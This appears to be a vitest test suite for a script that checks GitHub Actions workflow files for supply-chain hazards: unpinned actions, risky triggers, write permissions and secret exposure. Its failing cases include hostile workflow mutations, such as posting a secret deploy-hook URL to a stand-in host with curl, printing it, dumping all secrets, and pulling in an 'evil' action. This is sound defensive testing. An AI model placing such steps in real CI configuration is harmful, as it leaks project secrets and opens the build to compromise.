// AC-M0-03. Contract for scripts/check-workflows.mjs: `node scripts/check-workflows.mjs [rootDir]`
// checks <rootDir or cwd>/.github/workflows/*.yml; exit 1 on any violation, 0 when clean.
import { describe, expect, it } from 'vitest';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { makeRepo, runScript, REPO_ROOT } from './_testlib.mjs';

const CHECK = join(REPO_ROOT, 'scripts', 'check-workflows.mjs');
const SHA = 'a'.repeat(40);

const CI = `name: ci
on:
  pull_request:
    branches: [main]
  push:
    branches: [main]
permissions:
  contents: read
jobs:
  web:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${SHA}
      - run: npm ci
`;
const INGEST = `name: ingest
on:
  schedule:
    - cron: '0 */6 * * *'
  workflow_dispatch:
permissions:
  contents: read
jobs:
  ingest:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${SHA}
      - run: npm ci
`;
const SIGN = `name: sign-feed
on:
  schedule:
    - cron: '0 */6 * * *'
  workflow_dispatch:
permissions:
  contents: read
jobs:
  sign:
    if: github.ref == 'refs/heads/main'
    environment: feed-signing
    runs-on: ubuntu-latest
    steps:
      - run: node scripts/sign-feed.mjs
`;
const PROBE = `name: sign-gate-probe
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  probe:
    environment: feed-signing
    runs-on: ubuntu-latest
    steps:
      - run: echo "secret_present=$PRESENT"
        env:
          PRESENT: \${{ secrets.FEED_SIGNING_KEY != '' }}
`;

const REBUILD = `name: Daily rebuild
on:
  schedule: [{ cron: '0 13 * * *' }]
  workflow_dispatch: {}
permissions: {}
jobs:
  rebuild:
    runs-on: ubuntu-latest
    timeout-minutes: 2
    steps:
      - name: Call the Pages deploy hook
        env: { HOOK: '\${{ secrets.PAGES_DEPLOY_HOOK_URL }}' }
        run: test -n "$HOOK" && curl -fsS -X POST --max-time 20 "$HOOK" -o /dev/null -w 'status=%{http_code}\\n'
`;

const check = (wf) => {
  const files = {};
  for (const [name, body] of Object.entries(wf)) files[`.github/workflows/${name}`] = body;
  return runScript(CHECK, makeRepo(files), []);
};
const fails = (wf) => expect(check(wf).status).toBe(1);
/** Exit 1 AND the named rule id is printed for the named file (a crash or unrelated failure cannot pass). */
const failsWith = (wf, rule, file = Object.keys(wf)[0]) => {
  const r = check(wf);
  expect(r.status).toBe(1);
  expect(r.out).toContain(`${file}: ${rule}`);
};
const passes = (wf) => {
  const r = check(wf);
  expect(r.out).not.toMatch(/\n\s+at /);
  expect(r.status).toBe(0);
};

describe('check-workflows (AC-M0-03)', () => {
  it('passes a clean ci.yml', () => expect(check({ 'ci.yml': CI }).status).toBe(0));
  it('passes clean ingest, sign-feed and probe workflows', () =>
    expect(check({ 'ci.yml': CI, 'ingest.yml': INGEST, 'sign-feed.yml': SIGN, 'sign-gate-probe.yml': PROBE }).status).toBe(0));

  it('fails pull_request_target', () => failsWith({ 'ci.yml': CI.replace('pull_request:', 'pull_request_target:') }, 'trigger_set'));
  it('fails an unpinned uses: actions/checkout@v4', () =>
    fails({ 'ci.yml': CI.replace(`checkout@${SHA}`, 'checkout@v4') }));
  it('fails a missing top-level permissions block', () =>
    fails({ 'ci.yml': CI.replace('permissions:\n  contents: read\n', '') }));
  it('fails ingest.yml with a pull_request trigger', () =>
    fails({ 'ingest.yml': INGEST.replace('workflow_dispatch:', 'workflow_dispatch:\n  pull_request:') }));
  it('fails sign-feed.yml containing npm ci', () =>
    fails({ 'sign-feed.yml': SIGN.replace('node scripts/sign-feed.mjs', 'npm ci') }));
  it('fails sign-feed.yml lacking environment: feed-signing', () =>
    fails({ 'sign-feed.yml': SIGN.replace('    environment: feed-signing\n', '') }));
  it('fails sign-feed.yml lacking the main guard', () =>
    fails({ 'sign-feed.yml': SIGN.replace("    if: github.ref == 'refs/heads/main'\n", '') }));

  // M3 additions
  it('fails a third workflow containing environment: feed-signing', () =>
    fails({ 'sign-feed.yml': SIGN, 'other.yml': CI + '    environment: feed-signing\n' }));
  it('fails sign-gate-probe.yml with a uses: line', () =>
    fails({ 'sign-gate-probe.yml': PROBE.replace('    steps:\n', `    steps:\n      - uses: actions/checkout@${SHA}\n`) }));
  it('fails sign-gate-probe.yml with a second run: step', () =>
    fails({ 'sign-gate-probe.yml': PROBE + '      - run: echo two\n' }));
  it('fails sign-gate-probe.yml with a push trigger', () =>
    fails({ 'sign-gate-probe.yml': PROBE.replace('  workflow_dispatch:', '  workflow_dispatch:\n  push:') }));
  it('fails sign-gate-probe.yml with any other secrets. reference', () =>
    fails({ 'sign-gate-probe.yml': PROBE.replace('FEED_SIGNING_KEY', 'R2_API_TOKEN') }));

  it("passes the repo's real workflows", () => expect(runScript(CHECK, REPO_ROOT).status).toBe(0));

  // R2a-db: the db job exports the local stack's public API URL and demo keys for db:test:rest (spec R2a 1(g))
  const DB_JOB = `  db:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${SHA}
      - name: Export the local API URL and keys
        run: supabase status -o env | grep -E '^(API_URL|ANON_KEY|PUBLISHABLE_KEY)=' | tr -d '"' >> "$GITHUB_ENV"
      - run: npm run db:test:rest
`;
  it('passes a ci.yml whose db job has the API env-export step and db:test:rest', () => passes({ 'ci.yml': CI + DB_JOB }));
  it('fails that db job when the export step is unpinned or reads a secret', () => {
    fails({ 'ci.yml': CI + DB_JOB.replace(`checkout@${SHA}`, 'checkout@v4') });
    fails({ 'ci.yml': CI + DB_JOB.replace('>> "$GITHUB_ENV"', '>> "$GITHUB_ENV"\n        env:\n          K: ${{ secrets.SERVICE_KEY }}') });
  });
  it("the repo's ci.yml db job carries the export step before db:test:rest", () => {
    const ci = readFileSync(join(REPO_ROOT, '.github', 'workflows', 'ci.yml'), 'utf8');
    const exp = ci.indexOf("grep -E '^(API_URL|ANON_KEY|PUBLISHABLE_KEY)='");
    expect(exp).toBeGreaterThan(-1);
    expect(exp).toBeLessThan(ci.indexOf('npm run db:test:rest'));
  });
});

// ---- Amendment 4 / AC-M0-16: yaml-parsed adversarial cases ----
const IDENTITY_JOB = `  identity:
    runs-on: ubuntu-latest
    timeout-minutes: 5
    steps:
      - uses: actions/checkout@${SHA}
        with:
          persist-credentials: false
          fetch-depth: 0
      - name: Commit identity and diff hygiene
        env:
          EVENT: \${{ github.event_name }}
          BASE: \${{ github.event.pull_request.base.sha || github.event.before }}
        run: node scripts/secret-scan.mjs --no-files --range "$BASE..HEAD"
`;
const SIGN_JOB_GUARD = `name: sign-feed
on:
  schedule:
    - cron: '0 */6 * * *'
  workflow_dispatch:
permissions:
  contents: read
jobs:
  sign:
    if: \${{ github.ref == 'refs/heads/main' }}
    environment:
      name: feed-signing
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@${SHA}
      - run: node scripts/sign-feed.mjs
`;

describe('check-workflows rebuild.yml (AC-R0-03)', () => {
  const STEP = '    steps:\n';
  it('passes a clean rebuild.yml', () => passes({ 'rebuild.yml': REBUILD }));
  it('fails rebuild.yml with a uses: line', () =>
    failsWith({ 'rebuild.yml': REBUILD.replace(STEP, `${STEP}      - uses: actions/checkout@${SHA}\n`) }, 'rebuild_uses'));
  it('fails rebuild.yml with a flow-style uses', () =>
    failsWith({ 'rebuild.yml': REBUILD.replace(STEP, `${STEP}      - { uses: actions/setup-node@${SHA} }\n`) }, 'rebuild_uses'));
  it('fails rebuild.yml running npm ci', () =>
    failsWith({ 'rebuild.yml': REBUILD.replace(STEP, `${STEP}      - run: npm ci\n`) }, 'rebuild_pkg'));
  it('fails rebuild.yml mentioning actions/checkout', () =>
    failsWith({ 'rebuild.yml': REBUILD.replace(STEP, `${STEP}      - run: echo actions/checkout\n`) }, 'rebuild_checkout'));
  it('fails rebuild.yml with permissions missing', () =>
    failsWith({ 'rebuild.yml': REBUILD.replace('permissions: {}\n', '') }, 'rebuild_permissions'));
  it('fails rebuild.yml with permissions contents: read', () =>
    failsWith({ 'rebuild.yml': REBUILD.replace('permissions: {}', 'permissions:\n  contents: read') }, 'rebuild_permissions'));
  it('fails rebuild.yml with a second secret', () =>
    failsWith({ 'rebuild.yml': REBUILD.replace("HOOK: '", "OTHER: '\${{ secrets.R2_API_TOKEN }}', HOOK: '") }, 'rebuild_secret'));
  it('fails rebuild.yml with secrets: inherit', () =>
    failsWith({ 'rebuild.yml': REBUILD.replace('    runs-on: ubuntu-latest', '    secrets: inherit\n    runs-on: ubuntu-latest') }, 'rebuild_secret'));
  it('fails rebuild.yml with an extra trigger', () =>
    failsWith({ 'rebuild.yml': REBUILD.replace('  workflow_dispatch: {}', '  workflow_dispatch: {}\n  push: {}') }, 'trigger_set'));
  it("passes the repo's real rebuild.yml on its own", async () => {
    const { readFileSync } = await import('node:fs');
    const real = readFileSync(join(REPO_ROOT, '.github', 'workflows', 'rebuild.yml'), 'utf8');
    passes({ 'rebuild.yml': real });
  });
});

describe('check-workflows rebuild.yml exact shape (AC-R0-07)', () => {
  const RUN = `test -n "$HOOK" && curl -fsS -X POST --max-time 20 "$HOOK" -o /dev/null -w 'status=%{http_code}\\n'`;
  const shape = async (text) => (await import(CHECK)).checkWorkflow('rebuild.yml', text);
  const bad = (label, mutate) =>
    it(`rebuild_shape: ${label}`, async () => {
      const text = mutate(REBUILD);
      expect(text).not.toBe(REBUILD);
      expect((await shape(text)).join('\n')).toContain('rebuild_shape');
    });
  bad('run prints the hook', (t) => t.replace(RUN, `printf '%s\\n' "$HOOK"`));
  bad('run posts the hook to another URL', (t) => t.replace(RUN, `curl -fsS -X POST -d "$HOOK" https://example.invalid/x`));
  bad('a second job', (t) => t + '  other:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n');
  bad('a second step', (t) => t + '      - run: echo two\n');
  bad('cron every 5 minutes', (t) => t.replace('0 13 * * *', '*/5 * * * *'));
  bad('job-level permissions contents: read', (t) => t.replace('    timeout-minutes: 2\n', '    timeout-minutes: 2\n    permissions: { contents: read }\n'));
  bad('run containing n""pm ci', (t) => t.replace(RUN, RUN + ' && n""pm ci'));
  bad('an extra env key', (t) => t.replace("env: { HOOK:", "env: { EXTRA: x, HOOK:"));
  bad('timeout-minutes 30', (t) => t.replace('timeout-minutes: 2', 'timeout-minutes: 30'));
  it('the real rebuild.yml returns []', async () => {
    const { readFileSync } = await import('node:fs');
    const real = readFileSync(join(REPO_ROOT, '.github', 'workflows', 'rebuild.yml'), 'utf8');
    expect(await shape(real)).toEqual([]);
    expect(await shape(REBUILD)).toEqual([]);
  });
});

describe('check-workflows adversarial cases (AC-M0-16)', () => {
  it('passes a ci.yml with an identity job', () => passes({ 'ci.yml': CI + IDENTITY_JOB }));

  it('quoted "on": [pull_request_target] -> trigger_set', () =>
    failsWith({ 'ci.yml': CI.replace(/\non:[\s\S]*?permissions:/, '\n"on": [pull_request_target]\npermissions:') }, 'trigger_set'));
  it('ci.yml with an extra workflow_run trigger -> trigger_set', () =>
    failsWith({ 'ci.yml': CI.replace('  push:\n', '  workflow_run:\n    workflows: [x]\n  push:\n') }, 'trigger_set'));
  it('ci.yml missing the push trigger -> trigger_set', () =>
    failsWith({ 'ci.yml': CI.replace('  push:\n    branches: [main]\n', '') }, 'trigger_set'));
  it('ci.yml pull_request.branches other than [main] -> trigger_set', () =>
    failsWith({ 'ci.yml': CI.replace('pull_request:\n    branches: [main]', 'pull_request:\n    branches: [main, dev]') }, 'trigger_set'));
  it('a workflow file not in the allow map -> unknown_workflow', () =>
    failsWith({ 'surprise.yml': CI }, 'unknown_workflow'));

  it('flow-style step { uses: owner/action@v4 } -> uses_unpinned', () =>
    failsWith({ 'ci.yml': CI.replace(`      - uses: actions/checkout@${SHA}\n`, '      - { uses: owner/action@v4 }\n') }, 'uses_unpinned'));
  it('flow-style reusable job -> uses_unpinned', () =>
    failsWith({ 'ci.yml': CI.replace(/jobs:[\s\S]*$/, 'jobs: { x: { uses: owner/repo/.github/workflows/w.yml@main } }\n') }, 'uses_unpinned'));
  it('docker:// uses -> uses_unpinned', () =>
    failsWith({ 'ci.yml': CI.replace(`actions/checkout@${SHA}`, 'docker://alpine') }, 'uses_unpinned'));
  it('a uses key under with: -> uses_position', () =>
    failsWith({ 'ci.yml': CI.replace('      - run: npm ci', `      - run: npm ci\n        with:\n          uses: actions/checkout@${SHA}`) }, 'uses_position'));
  it('a local ./ uses with a .. segment is rejected', () =>
    failsWith({ 'ci.yml': CI.replace(`actions/checkout@${SHA}`, './../evil') }, 'uses_unpinned'));

  it('job permissions: { contents: write } in a PR workflow -> permissions_write', () =>
    failsWith({ 'ci.yml': CI.replace('    runs-on: ubuntu-latest', '    permissions:\n      contents: write\n    runs-on: ubuntu-latest') }, 'permissions_write'));
  it('job permissions: write-all -> permissions_write', () =>
    failsWith({ 'ci.yml': CI.replace('    runs-on: ubuntu-latest', '    permissions: write-all\n    runs-on: ubuntu-latest') }, 'permissions_write'));
  it('top-level permissions other than { contents: read } -> permissions_top', () =>
    failsWith({ 'ci.yml': CI.replace('contents: read', 'contents: read\n  issues: read') }, 'permissions_top'));

  it('run: echo ${{ secrets.X }} in a PR workflow -> pr_secret_ref', () =>
    failsWith({ 'ci.yml': CI.replace('npm ci', 'echo ${{ secrets.X }}') }, 'pr_secret_ref'));
  it('secrets: inherit on a PR job -> pr_secret_ref', () =>
    failsWith({ 'ci.yml': CI.replace(/jobs:[\s\S]*$/, 'jobs:\n  web:\n    uses: ./.github/workflows/x.yml\n    secrets: inherit\n') }, 'pr_secret_ref'));
  it("secrets['X'] in env -> pr_secret_ref", () =>
    failsWith({ 'ci.yml': CI.replace('      - run: npm ci', '      - run: npm ci\n        env: { T: "${{ secrets[\'X\'] }}" }') }, 'pr_secret_ref'));
  it('toJSON(secrets) -> pr_secret_ref', () =>
    failsWith({ 'ci.yml': CI.replace('npm ci', 'echo ${{ toJSON(secrets) }}') }, 'pr_secret_ref'));
  it('a PR job with an environment -> fails', () =>
    fails({ 'ci.yml': CI.replace('    runs-on: ubuntu-latest', '    environment: prod\n    runs-on: ubuntu-latest') }));
  it('an env NAME like SUPABASE_AUTH_CAPTCHA_SECRET is not a secrets reference', () =>
    passes({ 'ci.yml': CI.replace('      - run: npm ci', '      - run: npm ci\n        env:\n          SUPABASE_AUTH_CAPTCHA_SECRET: public-test') }));

  it('sign-feed.yml with the guard on a step, not the job -> signer_guard', () =>
    failsWith({ 'sign-feed.yml': SIGN.replace("    if: github.ref == 'refs/heads/main'\n", '').replace('      - run: node', "      - if: github.ref == 'refs/heads/main'\n        run: node") }, 'signer_guard'));
  it('sign-feed.yml with two jobs (one unguarded signer) -> fails', () =>
    fails({ 'sign-feed.yml': SIGN_JOB_GUARD + '  other:\n    environment:\n      name: feed-signing\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n' }));
  it('sign-feed.yml with environment { name } and a ${{ }} wrapped job guard -> passes', () =>
    passes({ 'sign-feed.yml': SIGN_JOB_GUARD }));
  it('sign-feed.yml job using a non-allowlisted action -> signer_uses', () =>
    failsWith({ 'sign-feed.yml': SIGN_JOB_GUARD.replace('actions/checkout', 'evil/action') }, 'signer_uses'));
  it('sign-feed.yml running pnpm -> signer_pkg', () =>
    failsWith({ 'sign-feed.yml': SIGN_JOB_GUARD.replace('node scripts/sign-feed.mjs', 'pnpm install') }, 'signer_pkg'));
  it('feed-signing environment in another file -> env_reserved', () =>
    failsWith({ 'ci.yml': CI + '  other:\n    environment:\n      name: feed-signing\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n' }, 'env_reserved'));

  it('sign-gate-probe.yml with a job-level if -> probe_if', () =>
    failsWith({ 'sign-gate-probe.yml': PROBE.replace('    environment:', "    if: github.ref == 'refs/heads/main'\n    environment:") }, 'probe_if'));
  it('sign-gate-probe.yml with two steps -> probe_steps', () =>
    failsWith({ 'sign-gate-probe.yml': PROBE + '      - run: echo two\n' }, 'probe_steps'));

  it('duplicate key -> yaml_invalid', () => failsWith({ 'ci.yml': CI + 'name: again\n' }, 'yaml_invalid'));
  it('a second YAML document -> yaml_multi_doc', () => failsWith({ 'ci.yml': CI + '---\nname: two\n' }, 'yaml_multi_doc'));
  it('<<: *anchor merge key -> yaml_merge_key', () =>
    failsWith({ 'ci.yml': CI.replace('jobs:', 'x: &a\n  k: v\ny:\n  <<: *a\njobs:') }, 'yaml_merge_key'));
  it('top level without jobs -> structure', () =>
    failsWith({ 'ci.yml': CI.replace(/jobs:[\s\S]*$/, '') }, 'structure'));

  it('exports checkWorkflow(name, text) and ALLOWED_TRIGGERS', async () => {
    const mod = await import(CHECK);
    expect(mod.checkWorkflow('ci.yml', CI + IDENTITY_JOB)).toEqual([]);
    expect(mod.checkWorkflow('ci.yml', CI.replace('pull_request:', 'pull_request_target:')).join('\n')).toContain('trigger_set');
    expect(Object.keys(mod.ALLOWED_TRIGGERS).sort()).toEqual(['ci.yml', 'ingest.yml', 'rebuild.yml', 'sign-feed.yml', 'sign-gate-probe.yml']);
  });

  it('the real ci.yml has the identity job and passes', async () => {
    const { readFileSync } = await import('node:fs');
    const ci = readFileSync(join(REPO_ROOT, '.github', 'workflows', 'ci.yml'), 'utf8');
    expect(ci).toMatch(/^ {2}identity:/m);
    expect(ci).toContain('secret-scan.mjs --no-files --range');
    expect(ci).toContain('git diff --check');
    expect(runScript(CHECK, REPO_ROOT).status).toBe(0);
  });
});
